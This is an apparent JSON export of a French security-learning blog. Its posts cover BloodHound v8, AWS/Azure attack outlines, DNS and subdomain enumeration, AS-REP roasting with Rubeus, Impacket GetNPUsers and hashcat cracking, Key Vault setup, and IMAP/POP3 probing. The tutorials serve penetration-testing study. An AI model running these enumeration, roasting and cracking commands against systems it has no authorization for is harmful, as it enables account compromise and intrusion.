[{"content":"Introduction BloodHound v8.0, released on July 29, 2025, marks one of the most significant functional updates since the tool\u0026rsquo;s inception. With this version, SpecterOps introduces a major evolution in identity attack path management, expanding BloodHound’s capabilities beyond Active Directory and Entra ID thanks to OpenGraph.\n1. Ease of Use: Faster and Clearer Access to Information Table View Users can now select the Table layout to display query results in a sortable, structured table, allowing them to choose relevant data and export it to CSV. This enhances quick analysis and facilitates collaboration between identity and security teams.\nQuery Library Over 170 prebuilt queries, organized in YAML format, are available in both BloodHound Enterprise and Community Editions. These queries cover practical use cases and are accessible through a dedicated interface. 2. ACE Inheritance Tracking BloodHound can now precisely highlight where privileges are inherited in Active Directory, allowing defenders to mitigate risk at the source without manually tracing permission inheritance.\n3. Microsoft Privileged Identity Management (PIM) BloodHound Enterprise now supports PIM roles: it detects attack paths that rely on these roles—even when they are not active—and flags misconfigurations where sensitive roles can be activated without MFA.\n4. Expanded Visibility into Domain and Forest Trusts The previous TrustedBy model has been replaced by four new trust edge types, offering more accurate visibility into how trusts are configured and whether they can be abused.\n5. BloodHound OpenGraph: A New Frontier in Attack Path Analysis OpenGraph enables BloodHound to ingest data from third-party platforms (GitHub, Snowflake, Microsoft SQL Server, etc.), extending attack path mapping beyond AD to any critical enterprise system.\n6. New Extensibility-Oriented Features Privilege Zones Analysis Allows the definition of \u0026ldquo;Privilege Zones\u0026rdquo; to focus on the most sensitive or regulated assets (e.g., PCI, HIPAA). This enables a refined, organization-wide Least Privilege approach.\nIntegrations ServiceNow: Automatically generates tickets to track discovered vulnerabilities. Duo: Supports multi-factor authentication for accessing BloodHound Enterprise. Conclusion BloodHound v8.0 represents a major step forward by combining:\nImproved usability (Table View, Query Library, Inheritance Tracking) Extended reach (OpenGraph for external platforms) Stronger security posture (PIM support, Privilege Zones, MFA integrations) Whether you\u0026rsquo;re part of a Red Team mapping complex attack paths or a Blue Team managing identity risk, BloodHound v8.0 is a strategic tool for proactively and holistically managing access and privilege across the enterprise.\n","permalink":"https://nyobemichel.me/posts/articles/bloodhound-v8/","summary":"Explore BloodHound v8, an advanced Active Directory mapping tool used by Red Teams to identify attack paths. Discover its setup, graph-based architecture, and new security and management features.","title":"BloodHound v8"},{"content":"Intro AWS AWS Organization AWS principals Exploitation of AWS Services IAM STS - Security Token Service KMS - key Management Service Secret Manager s3 - Simple Storage Service EC2 Elastic Cloud Computing lighsail lambda API Gateway EFS Elastic File System RDS - Relational Database Service DynamoDB ECR - Elastic Container Registry ECS - Elastic Container Service Beanstalk CodeBuild SQS Simple Queue Service SNS Simple Notification Service Cognito Methodologie AWS White Box Methodology AWS Black Box Methodology How to Bypass Detections Cloudtrail GuardDuty\n","permalink":"https://nyobemichel.me/posts/formations/aws-attack-and-defense/","summary":"Explorez les techniques d\u0026rsquo;attaque et de défense sur AWS : reconnaissance, exploitation, élévation de privilèges, détection et mitigation.","title":"AWS Attack and Defense: Stratégies offensives et défensives dans le cloud"},{"content":" Azure Basics Azure Organization Entra I Azure Tokens \u0026amp; APIs Basic Enumeration Tools Exploitation of Azure Services Entra ID IAM6 Azure IAM3 Azure Applications1 Azure Key Vault6 Azure Virtual Machine \u0026amp; Networking7 Storage Accounts6 Azure File Share5 Azure Table Storage1 Azure SQL Database3 Azure MySQL \u0026amp; PostgreSQL2 Azure CosmosDB3 Azure App Service5 Azure Research Techniques Azure Function Apps4 Static Web Apps5 Azure Container Registry3 Azure Container Instances, Apps \u0026amp; Jobs7 Azure Queue2 Azure Service Bus2 Azure Automation Account3 Azure Logic Apps1 Azure Cloud Shell1 Azure Virtual Desktop2 Methodologies White box1 Black box2 Pivoting between Entra ID \u0026amp; AD (Coming soon)3 Common Detection Mechanisms Azure \u0026amp; Entra ID Logging \u0026amp; Monitoring1 Microsoft Sentinel Microsoft Defender for Cloud \u0026amp; Microsoft Defender EASM ","permalink":"https://nyobemichel.me/posts/formations/azure-attack-et-defense/","summary":"Découvrez les techniques d\u0026rsquo;attaque et de défense dans Azure, en explorant Entra ID, la sécurité des identités, et les bonnes pratiques pour renforcer votre posture cloud.","title":"Azure Attack et Defense"},{"content":"Comment fonctionne le DNS Lorsque vous saisissez le nom de domaine, votre ordinateur vérifie d\u0026rsquo;abord sa mémoire (cache) pour voir s\u0026rsquo;il se souvient de l\u0026rsquo;adresse IP d\u0026rsquo;une visite précédente. Dans le cas contraire, il fait appel à un résolveur DNS, généralement fourni par votre fournisseur d\u0026rsquo;accès à Internet (FAI). Le résolveur dispose également d\u0026rsquo;un cache. S\u0026rsquo;il n\u0026rsquo;y trouve pas l\u0026rsquo;adresse IP, il entame un parcours dans la hiérarchie DNS. Il commence par interroger un serveur de noms racine, qui agit comme le bibliothécaire d\u0026rsquo;Internet. Le serveur racine ne connaît pas l\u0026rsquo;adresse exacte, mais il sait qui la connaît : le serveur de noms de domaine de premier niveau (TLD) responsable de l\u0026rsquo;extension du domaine (par exemple, .com, .org). Il oriente le résolveur dans la bonne direction. |A|Enregistrement d\u0026rsquo;adresse|Mappe un nom d\u0026rsquo;hôte à son adresse IPv4.|www.example.com.DANS UN192.0.2.1| |AAAA|Enregistrement d\u0026rsquo;adresse IPv6|Mappe un nom d\u0026rsquo;hôte à son adresse IPv6.|www.example.com.EN AAAA2001:db8:85a3::8a2e:370:7334| |CNAME|Enregistrement de nom canonique|Crée un alias pour un nom d\u0026rsquo;hôte, le pointant vers un autre nom d\u0026rsquo;hôte.|blog.example.com.EN CNAMEwebserver.example.net.| |MX|Enregistrement d\u0026rsquo;échange de courrier|Spécifie le(s) serveur(s) de messagerie chargé(s) de gérer les e-mails pour le domaine.|example.com.EN MX 10mail.example.com.| |NS|Enregistrement du serveur de noms|Délégue une zone DNS à un serveur de noms faisant autorité spécifique.|example.com.EN N.-É.ns1.example.com.| |TXT|Enregistrement de texte|Stocke des informations textuelles arbitraires, souvent utilisées pour la vérification de domaine ou les politiques de sécurité.|example.com.EN TXT \u0026quot;v=spf1 mx -all\u0026quot;(enregistrement SPF)| |SOA|Début de l\u0026rsquo;enregistrement d\u0026rsquo;autorité|Spécifie les informations administratives sur une zone DNS, y compris le serveur de noms principal, l\u0026rsquo;e-mail de la personne responsable et d\u0026rsquo;autres paramètres.|example.com.À SOAns1.example.com. admin.example.com. 2024060301 10800 3600 604800 86400| |SRV|Dossier de service|Définit le nom d\u0026rsquo;hôte et le numéro de port pour des services spécifiques.|_sip._udp.example.com.DANS SRV 10 5 5060sipserver.example.com.| |PTR|Enregistrement du pointeur|Utilisé pour les recherches DNS inversées, mappant une adresse IP à un nom d\u0026rsquo;hôte.|1.2.0.192.in-addr.arpa.EN PTRwww.example.com.|\nOutils DNS dig : Outil de recherche DNS polyvalent qui prend en charge différents types de requêtes (A, MX, NS, TXT, etc.) et une sortie détaillée. nslookup : Outil de recherche DNS plus simple, principalement pour les enregistrements A, AAAA et MX. dnsenum : Outil d\u0026rsquo;énumération DNS automatisé, attaques par dictionnaire, force brute, transferts de zone (si autorisé). dnsrecon : Combine plusieurs techniques de reconnaissance DNS et prend en charge divers formats de sortie. theHarvester : Outil OSINT qui collecte des informations provenant de diverses sources, notamment les enregistrements DNS (adresses e-mail).\nDig La digcommande ( Domain Information Groper) est un utilitaire polyvalent et puissant permettant d\u0026rsquo;interroger les serveurs DNS et de récupérer différents types d\u0026rsquo;enregistrements DNS. Sa flexibilité et ses résultats détaillés et personnalisables en font un choix incontournable.\nSous-domain Enumeration de sous-domains il s\u0026rsquo;agit du processus d\u0026rsquo;identification et de recensement systématiques de ces sous-domaines. Du point de vue DNS, les sous-domaines sont généralement représentés par des enregistrements A(ou, AAAApour IPv6, des enregistrements), qui associent le nom du sous-domaine à son adresse IP correspondante.\nÉnumération des sous-domaines actifs Une technique active plus courante brute-force enumerationconsiste à tester systématiquement une liste de noms de sous-domaines potentiels par rapport au domaine cible. Des outils comme dnsenum, ffufet gobusterpeuvent automatiser ce processus en utilisant des listes de mots de noms de sous-domaines courants ou des listes personnalisées basées sur des modèles spécifiques.\nÉnumération passive des sous-domaines Cette méthode s\u0026rsquo;appuie sur des sources d\u0026rsquo;informations externes pour découvrir les sous-domaines sans interroger directement les serveurs DNS de la cible. Certificate Transparency (CT) logsLes référentiels publics de certificats SSL/TLS constituent une ressource précieuse. Ces certificats incluent souvent une liste de sous-domaines associés dans leur champ « Subject Alternative Name » (SAN), offrant ainsi une mine d\u0026rsquo;informations sur les cibles potentielles.\nBruteforcement de sous-domaine il existe plusieurs outils disponibles qui excellent dans l’énumération par force brute : dnsénum fierce dnsrecon amass assetfinder puredns\nDNSEnum dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r Transferts de zone DNS Un transfert de zone DNS consiste essentiellement à copier tous les enregistrements DNS d\u0026rsquo;une zone (un domaine et ses sous-domaines) d\u0026rsquo;un serveur de noms à un autre.\nVous pouvez utiliser la digcommande pour demander un transfert de zone :\ndig axfr @nsztm1.digi.ninja zonetransfer.me Hotes Virtuels Une fois le DNS dirigé vers le bon serveur, la configuration du serveur web devient cruciale pour déterminer le traitement des requêtes entrantes.\nVirtual Hosts( VHosts) : Les hôtes virtuels sont des configurations au sein d\u0026rsquo;un serveur web permettant d\u0026rsquo;héberger plusieurs sites web ou applications sur un même serveur. Plusieurs outils sont disponibles pour aider à la découverte des hôtes virtuels : gobuster Feroxbuster ffuf\nGobuster Gobuster est un outil polyvalent couramment utilisé pour le forçage de répertoires et de fichiers, mais il excelle également dans la découverte d\u0026rsquo;hôtes virtuels. Il envoie systématiquement des requêtes HTTP avec différents Hosten-têtes à une adresse IP cible, puis analyse les réponses pour identifier les hôtes virtuels valides.\ngobuster vhost -u http://\u0026lt;target_IP_address\u0026gt; -w \u0026lt;wordlist_file\u0026gt; --append-domain Certificate Transparency Logs Banner Grabbing La première étape consiste à collecter les informations directement depuis le serveur web. Pour ce faire, nous utilisons la curlcommande avec l\u0026rsquo; -Iindicateur (ou --head) pour récupérer uniquement les en-têtes HTTP, et non l\u0026rsquo;intégralité du contenu de la page.\nNikto https://web.archive.org/\n","permalink":"https://nyobemichel.me/posts/learn/dns/","summary":"DNS","title":"DNS"},{"content":"Avec l\u0026rsquo;adoption massive du cloud computing, les entreprises migrent de plus en plus leurs infrastructures vers des environnements flexibles, scalables et accessibles à distance. Parmi les principaux fournisseurs de services cloud, Microsoft Azure occupe une place de leader, offrant un large éventail de services allant de la simple machine virtuelle à des solutions complexes d\u0026rsquo;intelligence artificielle, de gestion d\u0026rsquo;identité, ou encore de DevOps. Cependant, cette complexité fonctionnelle ouvre également la voie à de nombreuses erreurs de configuration, abus de privilèges et vulnérabilités potentielles. Azure, en tant que plateforme, peut être la cible de différentes techniques offensives utilisées par des attaquants internes ou externes cherchant à compromettre l’intégrité, la disponibilité ou la confidentialité des ressources cloud d’une organisation.\nAccès Initial (Initial Access) Credential stuffing (Azure AD / Entra ID) Phishing avec MFA Fatigue / Consent Phishing Token replay (refresh ou access tokens volés) Abuse des partages publics (Blob/Files avec ACL public) Exploitation de credentials hardcodés (dans code, Azure DevOps, GitHub Actions) Exploitation de mots de passe faibles sur comptes invités ou service principals Exploitation d’une app mal configurée (malicious redirect URI, consent mal géré) Évasion des Défenses (Defense Evasion) Suppression des logs dans Azure Monitor / Log Analytics Usage de credentials temporaires (MSI tokens, access tokens via IMDS) Utilisation d’applications \u0026ldquo;trusted\u0026rdquo; (abuse de consentements OAuth) Ajout de règles de suppression d’alertes dans Microsoft Defender for Cloud ByPass Conditional Access (via Identity Protection, ou device spoofing) Escalade de Privilèges (Privilege Escalation) Abus de rôles mal configurés : Owner, User Access Administrator, Contributor, etc. Chaining permissions : Lecture de secrets dans Key Vault → accès admin Escalade via Automation Account / Runbook Abuse d’un Logic App ou Function App Abus de Managed Identities (MSI) pour obtenir des tokens avec haut privilège ","permalink":"https://nyobemichel.me/posts/roadmap/azure-hacking/","summary":"Azure Hacking","title":"Azure Hacking"},{"content":"Lorsque l’authentification se produit dans Kerberos, la première chose qui se produit est une demande d’authentification au contrôleur de domaine afin que l’identité qui tente de s’authentifier puisse être vérifiée. Cette demande est connue sous le nom de demande de serveur d’authentification (AS-REQ). Une fois l\u0026rsquo;authentification du client validée, le contrôleur de domaine envoie une réponse du serveur d\u0026rsquo;authentification (AS-REP) au client, contenant une clé de session et un ticket d\u0026rsquo;octroi de ticket (TGT). AS-REP Roasting vide les hachages krbasrep5 des comptes utilisateurs dont la pré-authentification Kerberos est désactivée. Contrairement à Kerberoasting, ces utilisateurs ne doivent pas nécessairement être des comptes de service. La seule condition pour pouvoir effectuer AS-REP Roasting sur un utilisateur est que la pré-authentification soit désactivée.\nrubeus.exe asreproast Déchiffrez ces hachages avec hashcat - 1.) Transférez le hachage de la machine cible vers votre machine attaquante et placez le hachage dans un fichier txt\n2.) Insérez 23$ après $krb5asrep$ afin que la première ligne soit $krb5asrep$23$User\u0026hellip;..\nUtilisez la même liste de mots que celle que vous avez téléchargée dans la tâche 4\n3.) hashcat -m 18200 hash.txt Pass.txt - Décryptez ces hachages ! La torréfaction Rubeus AS-REP utilise le mode hashcat 18200.\nEnumeration - Identification des comptes vulnérables Au cours de cette phase, vous identifiez les comptes utilisateurs Active Directory pour lesquels la pré-authentification Kerberos est désactivée. Les comptes sans pré-authentification permettent à tout utilisateur du réseau de demander un ticket Kerberos (notamment un AS-REP) sans avoir à prouver son identité. Rubeus GetNPUsers.py d\u0026rsquo;Impacket\nGetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py https://www.hackthebox.com/blog/as-rep-roasting-detection\n","permalink":"https://nyobemichel.me/posts/activedirectory/as-rep-roasting/","summary":"Entra ID","title":"AS-REP roasting"},{"content":"Le moyen le plus simple d\u0026rsquo;accéder aux données WHOIS est d\u0026rsquo;utiliser l\u0026rsquo; whoisoutil en ligne de commande. IANA (Internet Assigned Numbers Authority )\n","permalink":"https://nyobemichel.me/posts/outils/whois/","summary":"Whois","title":"Whois"},{"content":"","permalink":"https://nyobemichel.me/posts/roadmap/active-directory---hacking/","summary":"key vault","title":"Active Directory - Hacking"},{"content":"Qu’est-ce qu’Azure Key Vault ? Azure Key Vault est un service cloud permettant de stocker les secrets et d’y accéder en toute sécurité.Il peut s’agir de:\nLes secrets : mots de passe, chaînes de connexion, jetons, etc. Les clés de chiffrement : pour chiffrer des données dans d\u0026rsquo;autres services. Les certificats : certificats SSL/TLS utilisés dans des services Azure. Les modules HSM (Hardware Security Modules) : stocker les clés dans du matériel sécurisé. son objectif est d\u0026rsquo;éviter d\u0026rsquo;intégrer des données directement dans le code source d\u0026rsquo;un programme ou d\u0026rsquo;un autre objet exécutable les fichiers de configuration. cas d\u0026rsquo;tilisation de Azure Key Vault La centralisation du stockage des secrets d’application dans Azure Key Vault vous permet de contrôler la distribution de ces secrets. Key Vault réduit considérablement les risques de fuite accidentelle des secrets. Lorsque les développeurs d’applications utilisent Key Vault, ils n’ont plus besoin de stocker des informations de sécurité dans leur application.\nAuthentification sécurisée : Une app web récupère un secret DB via Key Vault Chiffrement de données : Azure SQL, Blob, ou Disk utilisent une clé stockée dans Key Vault Rotation automatique : Gestion automatique des certificats SSL Intégration DevSecOps : Azure DevOps ou GitHub récupèrent des secrets à l\u0026rsquo;exécution\nArchitecture et composants Le service Key Vault prend en charge deux types de conteneurs : les coffres et les pools HSM (modules de sécurité matériels) managés. Les coffres prennent en charge le stockage des clés logicielles et sauvegardées avec HSM, les secrets et les certificats. Les pools HSM managés prennent uniquement en charge les clés sauvegardées avec HSM. les secrets et les certificats sont collectivement appelés « objets ».\nIdentificateurs d\u0026rsquo;objet Les objets sont identifiés de manière unique dans Key Vault à l’aide d’un identificateur qui ne respecte pas la casse appelé identificateur d’objet. Il n’y a pas deux objets avec le même identificateur dans le système, quel que soit l’emplacement géographique. L’identificateur est constitué d’un préfixe qui identifie le coffre de clés, du type d’objet, du nom d’objet fourni par l’utilisateur et d’une version d’objet. Les identificateurs qui n’incluent pas la version de l’objet sont appelés des « identificateurs de base ». Les identificateurs d’objet Key Vault sont également des URL valides.\nUn identificateur d’objet a le format général suivant (selon le type de conteneur) :\nPour les coffres : https://{vault-name}.vault.azure.net/{object-type}/{object-name}/{object-version} Pour les pools Managed HSM : https://{hsm-name}.managedhsm.azure.net/{object-type}/{object-name}/{object-version} Structure d’URL de requête Les opérations de gestion des clés utilisent des verbes HTTP, notamment DELETE, GET, PATCH et PUT. Les opérations de chiffrement sur les objets clés existants utilisent HTTP POST.\nPour les clients qui ne peuvent pas prendre en charge des verbes HTTP spécifiques, Azure Key Vault autorise l’utilisation de HTTP POST avec l’en-tête X-HTTP-REQUEST pour spécifier le verbe prévu.\nPour utiliser des objets dans Azure Key Vault, voici des exemples d’URL :\nPour CRÉER une clé appelée TESTKEY dans un coffre de clés, utilisez : PUT /keys/TESTKEY?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nPour IMPORTER une clé appelée IMPORTEDKEY dans un coffre de clés, utilisez - POST /keys/IMPORTEDKEY/import?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nPour OBTENIR un secret appelé MYSECRET dans un coffre de clés, utilisez - GET /secrets/MYSECRET?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nPour SIGNER un code de hachage utilisant une clé nommée TESTKEY dans Key Vault, utilisez : POST /keys/TESTKEY/sign?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nL’autorité pour une demande adressée à un Key Vault est toujours la suivante :\nPour les coffres : https://{keyvault-name}.vault.azure.net/ Pour les modules HSM managés : https://{HSM-name}.managedhsm.azure.net/ les clés sont toujours stockées sous le chemin /keys, tandis que les secrets sont toujours stockés sous le chemin /secrets. Options d’authentification Key Vault Lorsque vous créez un coffre de clés dans un abonnement Azure, il est automatiquement associé au locataire Microsoft Entra de l’abonnement. les applications peuvent accéder au coffre de clés de trois manières : Application uniquement : l’application représente un principal du service ou une identité managée. Utilisateur uniquement : l’utilisateur accède au coffre de clés à partir de n’importe quelle application inscrite dans le locataire. Application-plus-utilisateur (parfois appelé identité composée) : l’utilisateur est tenu d’accéder au coffre de clés à partir d’une application spécifique et l’application doit utiliser le flux OBO (Authentification On-Behalf-Of) pour emprunter l’identité de l’utilisateur.\nmodèle d’accès L’accès à un coffre de clés est contrôlé par le biais de deux interfaces : le plan de contrôle et le plan de données. Les deux plans utilisent Microsoft Entra ID pour l’authentification. Pour l’autorisation, le plan de contrôle utilise le contrôle d’accès en fonction du rôle Azure (Azure RBAC) et le plan de données utilise une stratégie d’accès Key Vault et Azure RBAC pour les opérations de plan de données Key Vault.\nKey Vault prend en charge les stratégies d’accès conditionnel Microsoft Entra. Vous pouvez contrôler l’accès aux clés, aux certificats et aux secrets Key Vault en utilisant des stratégies d’accès Azure RBAC ou Key Vault. créez un coffre de clés dans Azure Key Vault Azure Key Vault est un service cloud qui fonctionne comme un magasin des secrets sécurisé. Vous pouvez stocker des clés, des mots de passe, des certificats et d’autres secrets en toute sécurité.\nSi vous ne disposez pas d’un compte Azure, créez-en un gratuitement avant de commencer. Utilisez l’environnement Bash dans Azure Cloud Shell. https://shell.azure.com/ Si vous préférez exécuter des commandes de référence CLI localement, installez Azure CLI. Si vous exécutez sur Windows ou macOS, envisagez d’exécuter Azure CLI dans un conteneur Docker. Si vous utilisez une installation locale, connectez-vous à Azure CLI à l’aide de la commande az login. Lorsque vous y êtes invité, installez l’extension Azure CLI lors de la première utilisation. Exécutez az version pour rechercher la version et les bibliothèques dépendantes installées. Pour effectuer une mise à niveau vers la dernière version, exécutez az upgrade. Créer un groupe de ressources Un groupe de ressources est un conteneur logique dans lequel les ressources Azure sont déployées et gérées. Utilisez la commande az group create pour créer un groupe de ressources nommé myResourceGroup à l’emplacement eastus. az group create --name \u0026#34;myResourceGroup\u0026#34; --location \u0026#34;EastUS\u0026#34; Créer un coffre de clés Utilisez la commande Azure CLI az keyvault create pour créer un coffre de clés dans le groupe de ressources de l’étape précédente. Vous devrez fournir certaines informations : Nom du coffre de clés : chaîne de 3 à 24 caractères qui ne peut contenir que des chiffres (0-9), des lettres (a-z, A-Z) et des traits d’union (-).\nImportant\nChaque coffre de clés doit avoir un nom unique. Remplacez par le nom de votre coffre de clés dans les exemples suivants.\nGroupe de ressources nommé : myResourceGroup. Localisation : EastUS. az keyvault create --name \u0026#34;\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; --resource-group \u0026#34;myResourceGroup\u0026#34; Donner à votre compte d’utilisateur des autorisations pour gérer les secrets dans Key Vault Pour obtenir des autorisations sur votre coffre de clés par le biais du contrôle d’accès en fonction du rôle (RBAC ), attribuez un rôle à votre « nom d’utilisateur principal » (UPN) à l’aide de la commande Azure CLI az role assignment create. az role assignment create --role \u0026#34;Key Vault Secrets Officer\u0026#34; --assignee \u0026#34;\u0026lt;upn\u0026gt;\u0026#34; --scope \u0026#34;/subscriptions/\u0026lt;subscription-id\u0026gt;/resourceGroups/\u0026lt;resource-group-name\u0026gt;/providers/Microsoft.KeyVault/vaults/\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; Ajouter un secret au coffre de clés Utilisez la commande Azure CLI az keyvault secret set suivante pour créer une clé secrète dans Key Vault az keyvault secret set --vault-name \u0026#34;\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; --name \u0026#34;ExamplePassword\u0026#34; --value \u0026#34;hVFkk965BuUv\u0026#34; Récupérer un secret à partir de Key Vault Vous pouvez maintenant référencer ce mot de passe que vous avez ajouté à Azure Key Vault à l’aide de son URI. Utilisez https://\u0026lt;your-unique-keyvault-name\u0026gt;.vault.azure.net/secrets/ExamplePassword pour obtenir la version actuelle. Pour afficher la valeur contenue dans le secret sous forme de texte brut, utilisez la commande Azure CLI az keyvault secret show :\naz keyvault secret show --name \u0026#34;ExamplePassword\u0026#34; --vault-name \u0026#34;\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; --query \u0026#34;value\u0026#34; Key Vault est conçu pour stocker des secrets de configuration pour des applications serveur. Il n’est pas destiné au stockage des données appartenant aux utilisateurs de votre application. Les données utilisateur doivent être stockées ailleurs, par exemple, dans une base de données Azure SQL avec chiffrement transparent des données (Transparent data encryption), ou dans un compte de stockage avec chiffrement du service de stockage (Storage Service Encryption).\nRessources :\nhttps://learn.microsoft.com/fr-fr/cli/azure/keyvault?view=azure-cli-latest https://learn.microsoft.com/fr-fr/training/modules/manage-secrets-with-azure-key-vault/?source=recommendations https://learn.microsoft.com/fr-fr/azure/key-vault/general/security-features\n","permalink":"https://nyobemichel.me/posts/azure/key-vault/","summary":"key vault","title":"Key Vault"},{"content":"","permalink":"https://nyobemichel.me/posts/roadmap/aws---hacking/","summary":"key vault","title":"Key Vault"},{"content":"","permalink":"https://nyobemichel.me/posts/roadmap/web-hacking/","summary":"key vault","title":"Key Vault"},{"content":"Dans le monde des distributions Linux et windows, il existe de nombreuses façons de gérer les serveurs à distance.\nSSH Secure Shell( SSH) permet à deux ordinateurs d\u0026rsquo;établir une connexion chiffrée et directe au sein d\u0026rsquo;un réseau potentiellement non sécurisé sur le port standard TCP 22. Il existe donc deux protocoles concurrents : SSH-1et SSH-2. SSH-2, également connu sous le nom de SSH version 2, est un protocole plus avancé que SSH version 1 en termes de chiffrement, de vitesse, de stabilité et de sécurité. Par exemple, SSH-1 il est vulnérable aux MITMattaques, contrairement à SSH-2.\nRsync Rsync est un outil rapide et efficace pour copier des fichiers localement et à distance. Il permet de copier des fichiers localement sur une machine donnée et vers/depuis des hôtes distants.\nR-Services Les R-Services sont une suite de services hébergés pour permettre l\u0026rsquo;accès à distance ou l\u0026rsquo;exécution de commandes entre hôtes Unix via TCP/IP. R-servicesS\u0026rsquo;étendant sur les ports 512, 513, et 514et , ils ne sont accessibles que via une suite de programmes appelée r-commands. Ils sont le plus souvent utilisés par les systèmes d\u0026rsquo;exploitation commerciaux tels que Solaris, HP-UX et AIX. La suite R-commands se compose des programmes suivants :\nrcp ( remote copy) rexec ( remote execution) connexion r ( remote login) rsh ( remote shell) rstat temps de rupture rwho ( remote who) RDP Le protocole RDP (Remote Desktop Protocol RDPest un protocole développé par Microsoft pour l\u0026rsquo;accès à distance à un ordinateur exécutant Windows. Ce protocole permet la transmission chiffrée de commandes d\u0026rsquo;affichage et de contrôle via l\u0026rsquo;interface utilisateur graphique (GUI) sur les réseaux IP.\nWinRM La gestion à distance Windows ( WinRM) est un protocole simple de gestion à distance intégré à Windows, basé sur la ligne de commande. WinRM utilise le protocole Simple Object Access Protocol ( SOAP) pour établir des connexions aux hôtes distants et à leurs applications. Par conséquent, WinRM doit être explicitement activé et configuré à partir de Windows 10. WinRM s\u0026rsquo;appuie sur TCPles ports 5985et 5986pour communiquer.\nWMI Windows Management Instrumentation ( WMI) est l\u0026rsquo;implémentation de Microsoft et une extension du modèle commun d\u0026rsquo;information ( CIM), fonctionnalité essentielle de la gestion d\u0026rsquo;entreprise Web standardisée ( WBEM) pour la plateforme Windows.\nhttps://www.golinuxcloud.com/openssh-authentication-methods-sshd-config/ https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html\n","permalink":"https://nyobemichel.me/posts/learn/protocoles-de-gestion-%C3%A0-distance/","summary":"Protocoles de gestion à distance Linux","title":"Protocoles de gestion à distance"},{"content":"Par défaut, les ports 110et 995sont utilisés pour POP3, et les ports 143et 993sont utilisés pour IMAP. Les ports supérieurs ( 993et 995) utilisent TLS/SSL pour chiffrer les communications entre le client et le serveur. Grâce à Nmap, nous pouvons analyser le serveur à la recherche de ces ports\nPour interagir avec le serveur IMAP ou POP3 via SSL, nous pouvons utiliser openssl, ainsi que ncat. Les commandes correspondantes sont les suivantes :\nopenssl s_client -connect 10.129.14.128:pop3s nmap -p 143,993 --script imap-ntlm-info 10.0.0.3 msf6 auxiliary(scanner/pop3/pop3_version) Commandes IMAP 1 LOGIN username password Connexion de l\u0026rsquo;utilisateur. 1 LIST \u0026quot;\u0026quot; * Répertorie tous les répertoires. 1 CREATE \u0026quot;INBOX\u0026quot; Crée une boîte aux lettres avec un nom spécifié. 1 DELETE \u0026quot;INBOX\u0026quot; Supprime une boîte aux lettres. 1 RENAME \u0026quot;ToRead\u0026quot; \u0026quot;Important\u0026quot; Renomme une boîte aux lettres. 1 LSUB \u0026quot;\u0026quot; * Renvoie un sous-ensemble de noms de l\u0026rsquo;ensemble de noms que l\u0026rsquo;utilisateur a déclaré comme étant activeou subscribed. 1 SELECT INBOX Sélectionne une boîte aux lettres afin que les messages qu\u0026rsquo;elle contient soient accessibles. 1 UNSELECT INBOX Quitte la boîte aux lettres sélectionnée. 1 FETCH \u0026lt;ID\u0026gt; all Récupère les données associées à un message dans la boîte aux lettres. 1 CLOSESupprime tous les messages avec l\u0026rsquo; Deletedindicateur défini 1 LOGOUTFerme la connexion avec le serveur IMAP.\nCommandes POP3 USER username Identifie l\u0026rsquo;utilisateur. PASS password Authentification de l\u0026rsquo;utilisateur à l\u0026rsquo;aide de son mot de passe. STAT Demande le nombre d\u0026rsquo;e-mails enregistrés auprès du serveur. LIST Demande au serveur le nombre et la taille de tous les e-mails. RETR id Demande au serveur de livrer l\u0026rsquo;e-mail demandé par ID. DELE id Demande au serveur de supprimer l\u0026rsquo;e-mail demandé par ID. CAPADemande au serveur d\u0026rsquo;afficher les capacités du serveur. RSETDemande au serveur de réinitialiser les informations transmises. QUIT Ferme la connexion avec le serveur POP3.\nhttps://donsutherland.org/crib/imap https://www.atmail.com/blog/imap-101-manual-imap-sessions/\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration-imap----pop3/","summary":"IMAP/POP3","title":"Enumeration IMAP - POP3"},{"content":"Bienvenue dans cet annuaire complet de ressources en cybersécurité, cloud, DevOps, administration système, réseau, conteneurisation (Docker/Kubernetes), Red Team et Blue Team. Que vous soyez étudiant, professionnel en reconversion, passionné autodidacte ou ingénieur confirmé, ce guide regroupe des liens vers des plateformes gratuites et payantes pour apprendre, pratiquer, expérimenter et se certifier dans les domaines clés de la sécurité informatique et de l\u0026rsquo;administration des systèmes modernes.\nLa cybersécurité est un domaine en constante évolution. Il ne suffit plus d’apprendre en théorie : il faut pratiquer sur des environnements réalistes, se mesurer à des défis techniques, et découvrir les bonnes pratiques du monde réel. C’est dans cette optique que cet annuaire a été conçu : rassembler les meilleurs Labs interactifs, plateformes d\u0026rsquo;entraînement et simulateurs cloud accessibles sur Internet, tout en vous évitant de perdre du temps à chercher.\nHack The Box (HTB) Hack The Box Academy TryHackMe PentesterLab PortSwigger Web Security Academy Cyber Learning Red Labs - Altered Security Root Me VulnHub VulnMachines OWASP Juice Shop Damn Vulnerable Web App (DVWA) HackSplaining HackThisSite HackerTest SEED Security Labs pwnable.kr ZenK-Security Hacker101 CTF White-box pentesting (GitHub) Damn Vulnerable GraphQL App (GitHub) Generic University (GitHub) API Sandbox (GitHub) OWASP Docker Compose Top 10 OWASP Top 10 Labs Blue Team Labs Online RangeForce LetsDefend Security Blue Team Cyber Defenders Splunk Security Essentials Microsoft Applied Skills AWS Skill Builder Google Cloud Skills Boost CloudGoat - AWS (GitHub) AzureGoat (GitHub) AWSGoat (GitHub) TerraGoat (GitHub) Flaws.cloud Flaws2.cloud BigIAM Challenge Serverless CTF (SANS CloudWars) BadZure (GitHub) BustaKube SadServers KodeKloud Labs Gratuits LabEx Iximiuz Labs Play with Docker Linux Survival Bandit Wargame Kubernetes Goat Kubernetes Goat (GitHub) CI/CD Goat (GitHub) Atomic Red Team (GitHub) SQL Murder Mystery SQL Squid Game VIM Adventures Pwn College Pwn Tunisia 247CTF Crypto Challenge – Mystery Twister VulnLab Immersive Labs Red Team 